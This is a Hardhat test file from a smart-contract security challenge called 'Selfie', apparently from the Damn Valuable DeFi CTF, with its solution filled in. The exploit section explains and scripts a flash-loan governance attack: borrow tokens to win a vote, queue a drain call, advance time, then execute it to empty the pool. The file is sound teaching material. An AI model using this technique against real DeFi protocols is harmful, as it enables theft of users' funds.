const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /**
         * @dev
         * Our goal is to drain the funds. Conveniently, there is a function performing this exact action, but it can only be called by the SimpleGovernance contract.
         * Actions can be queued in the Governance contract, and can then be executed after 2 days. 
         * The requirement we need to meet to queue an action is to own more than half of the total supply of governance tokens.
         * This is where the flash loan comes into play: we borrow enough tokens to pass the _hasEnoughVotes requirement, then queue our action, which is an encoded call to _drainAllFunds().
         * We then wait 2 days (not literally, fortunately ethers.js provides us with a way to mimic time travel with 'evm_increaseTime' 😁), and call executeAction(), which will drain all the funds from the pool to our smart contract.
         */
        const SelfieAttackFactory = await ethers.getContractFactory(
          'SelfieAttack',
          deployer
        );

        this.attackselfie = await SelfieAttackFactory.deploy(
          this.pool.address, this.governance.address, this.token.address
        );
        console.log(`\u001b[1;35m Starting the flash loan`);
        await this.attackselfie.attack();

        console.log(`\u001b[1;35m "Waiting" 2 days`);
        await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]);

        console.log(`\u001b[1;35m Draining the funds`);
        await this.attackselfie.execute(attacker.address);
        /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
